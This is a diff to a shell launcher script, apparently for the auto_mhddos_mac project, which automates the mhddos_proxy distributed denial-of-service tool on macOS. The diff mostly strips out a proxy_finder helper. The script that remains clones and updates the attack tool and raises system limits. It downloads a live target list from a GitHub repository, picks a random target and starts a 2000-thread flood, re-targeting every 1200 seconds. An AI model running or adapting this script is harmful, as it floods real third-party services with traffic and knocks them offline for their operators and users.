@@ -32,21 +32,14 @@ rm -rf auto_mhddos_mac
 git clone https://github.com/alexnest-ua/auto_mhddos_mac
 rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
-rm -rf proxy_finder
-git clone https://github.com/alexnest-ua/proxy_finder.git
 cd ~/mhddos_proxy
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
 sleep 2
-python3.10 -m pip install -r requirements.txt
-#Install latest version of proxy_finder
-cd ~/proxy_finder
 python3.10 -m pip install -r requirements.txt
 
 restart_interval="1200"
 
 ulimit -n 1048576 || true
-
-
 
 
 threads="${1:-2000}"
@@ -79,7 +72,7 @@ fi
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters:  -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
 sleep 7
 
-trap 'echo signal received!; kill "${PID}"; kill "${PID1}"; wait "${PID}"; wait "${PID1}"; ctrl_c' SIGINT SIGTERM
+trap 'echo signal received!; kill "${PID}"; wait "${PID}"; ctrl_c' SIGINT SIGTERM
 
 function ctrl_c() {
         echo "Exiting..."
@@ -108,20 +101,6 @@ do
 		sleep 3
 	fi
 	
-	cd ~/proxy_finder
-
-  	num=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
-	echo "$num"
-   	
-	if ((num == 1));
-	then
-		clear
-		echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder\n\n"
-	else
-		python3.10 -m pip install -r requirements.txt
-		clear
-		echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder\n\n"
-	fi
 	
 	cd ~/auto_mhddos_mac
    	num=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
@@ -143,7 +122,6 @@ do
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | grep "^[^#]" | wc -l | tr -d " |\n")
 
 	i=$(shuf -i 1-$list_size -n 1)
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
       
    	echo -e "\n I = $i"
     	# Filter and only get lines that not start with "#". Then get one target from that filtered list.
@@ -162,11 +140,6 @@ do
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval seconds...\033[1;0m"
 	sleep 5
 	
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mStarting our new proxy_finder, next restart in $restart_interval...\033[1;0m"
-	
-	cd ~/proxy_finder
-    	python3.10 finder.py --threads 8500&
-	PID1="$!"
 	
 	
    	sleep $restart_interval
